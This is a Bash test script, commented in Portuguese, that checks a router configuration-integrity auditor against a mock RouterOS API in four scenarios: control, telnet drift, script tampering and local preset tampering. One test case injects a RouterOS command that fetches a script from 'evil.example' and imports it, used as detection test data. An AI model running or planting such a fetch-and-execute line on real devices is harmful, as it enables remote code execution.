#!/usr/bin/env bash
# Validação funcional — os 4 cenários da Tabela 2 do artigo, contra o mock da API.
#
# Uso: tests/scenarios.sh <binário ohboyscan> [--tls]
#   RUNNER="qemu-aarch64-static -L /usr/aarch64-linux-gnu" tests/scenarios.sh build-aarch64/ohboyscan
# Saída: tabela de resultados; código 0 se todos os cenários tiveram o resultado esperado.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
BIN="$(realpath "$1")"; shift || true
TLS=0; [[ "${1:-}" == "--tls" ]] && TLS=1
RUNNER="${RUNNER:-}"
WORK="$(mktemp -d /tmp/ohboyscan-scen-XXXXXX)"
PORT=$(( 20000 + RANDOM % 20000 ))
trap 'kill $MOCK_PID 2>/dev/null; rm -rf "$WORK"' EXIT

cp "$HERE/fixtures/router_state.json" "$WORK/state.json"
cp "$WORK/state.json" "$WORK/state.orig.json"

MOCK_ARGS=(--state "$WORK/state.json" --port "$PORT" --user ohboyscan --password audit-pass)
if (( TLS )); then
  openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -days 2 -subj "/CN=mock-router" \
    -keyout "$WORK/tls.key" -out "$WORK/tls.crt" 2>/dev/null
  FP=$(openssl x509 -in "$WORK/tls.crt" -outform DER | sha256sum | cut -d' ' -f1)
  MOCK_ARGS+=(--tls-cert "$WORK/tls.crt" --tls-key "$WORK/tls.key")
fi
python3 "$HERE/mock_routeros.py" "${MOCK_ARGS[@]}" > "$WORK/mock.log" 2>&1 &
MOCK_PID=$!
for _ in $(seq 50); do grep -q "mock RouterOS" "$WORK/mock.log" 2>/dev/null && break; sleep 0.1; done

cat > "$WORK/ohboyscan.conf" <<CONF
[router]
host = 127.0.0.1
port = $PORT
user = ohboyscan
password = audit-pass
tls = $( (( TLS )) && echo true || echo false )
$( (( TLS )) && echo "tls_fingerprint = $FP" )
timeout_ms = 3000

[paths]
data_dir = $WORK/data
log_file = $WORK/audit.jsonl
lock_file = $WORK/ohboyscan.lock

[alert]
syslog = false
command = cat >> $WORK/alerts.jsonl
CONF

ohb() { $RUNNER "$BIN" -c "$WORK/ohboyscan.conf" "$@"; }
export OHBOY_PASSPHRASE="pesquisa-puc-2026"

echo "== preparação: init + preset save (estado confiável) $( (( TLS )) && echo '[API-SSL + pinning]')"
ohb init --operator victor >/dev/null || { echo "init falhou"; exit 2; }
ohb preset save --operator victor --comment "baseline de laboratório" || { echo "preset save falhou"; exit 2; }

PASS=0; FAIL=0
declare -a ROWS
run_case() {  # nome  código_esperado  categoria_esperada(ou -)
  local name="$1" want_rc="$2" want_cat="$3" out rc
  out="$(ohb audit --json 2>&1)"; rc=$?
  echo "$out" > "$WORK/last.json"
  local ok=1
  [[ "$rc" == "$want_rc" ]] || ok=0
  if [[ "$want_cat" != "-" ]]; then grep -q "\"category\": \"$want_cat\"" <<<"$out" || ok=0; fi
  if [[ "$want_cat" == "-" ]]; then grep -q '"findings": \[\]' <<<"$out" || ok=0; fi
  local detail
  detail=$(python3 "$HERE/summarize_report.py" "$WORK/last.json" 2>/dev/null || head -c 200 "$WORK/last.json")
  if (( ok )); then PASS=$((PASS+1)); ROWS+=("PASS | $name | rc=$rc | $detail"); else FAIL=$((FAIL+1)); ROWS+=("FAIL | $name | rc=$rc (esperado $want_rc) | $detail"); fi
}
reset_state() { cp "$WORK/state.orig.json" "$WORK/state.json"; }
mutate() { python3 - "$WORK/state.json" "$1" <<'PY'
import json, sys
p, code = sys.argv[1], sys.argv[2]
s = json.load(open(p))
exec(code)
json.dump(s, open(p, "w"))
PY
}

# Cenário 1 — Controle (contadores voláteis mudam, mas são ignorados)
reset_state
mutate 's["/ip/firewall/filter"][0]["bytes"]="99999999"; s["/user"][0]["last-logged-in"]="2026-11-21 08:00:00"'
run_case "1. Controle (íntegro)" 0 -

# Cenário 2 — Desvio de configuração: Telnet habilitado
reset_state
mutate 'next(x for x in s["/ip/service"] if x["name"]=="telnet")["disabled"]="false"'
run_case "2. Desvio de configuração (telnet)" 1 config-drift
grep -q '/ip/service\[telnet\].disabled' "$WORK/last.json" || { FAIL=$((FAIL+1)); ROWS+=("FAIL | 2b. campo exato não reportado | | "); }

# Cenário 3 — Adulteração de script: um único caractere
reset_state
mutate 'x=s["/system/script"][1]; x["source"]=x["source"].replace("8.8.8.8","8.8.4.4",1)'
run_case "3a. Adulteração de script (1 caractere)" 1 script-tamper
reset_state
mutate 'x=s["/system/script"][0]; x["source"]+="\n/tool fetch url=\"http://evil.example/x.rsc\" dst-path=x.rsc; /import x.rsc"'
run_case "3b. Injeção de comando em script" 1 script-tamper

# Cenário 4 — Adulteração local do preset.json (mesmo com o roteador íntegro)
reset_state
cp "$WORK/data/preset.json" "$WORK/preset.bak"
sed -i '0,/"disabled": "true"/s//"disabled": "false"/' "$WORK/data/preset.json"
run_case "4. Adulteração local (preset.json)" 1 local-tamper
cp "$WORK/preset.bak" "$WORK/data/preset.json"

echo
echo "== Resultados"
printf '%s\n' "${ROWS[@]}" | column -t -s '|' 2>/dev/null || printf '%s\n' "${ROWS[@]}"
echo
echo "alertas disparados via alert.command: $(wc -l < "$WORK/alerts.jsonl" 2>/dev/null || echo 0)"
echo "trilha assinada:"; ohb history | sed 's/^/  /'
echo "$PASS cenários OK, $FAIL falhas"
(( FAIL == 0 ))
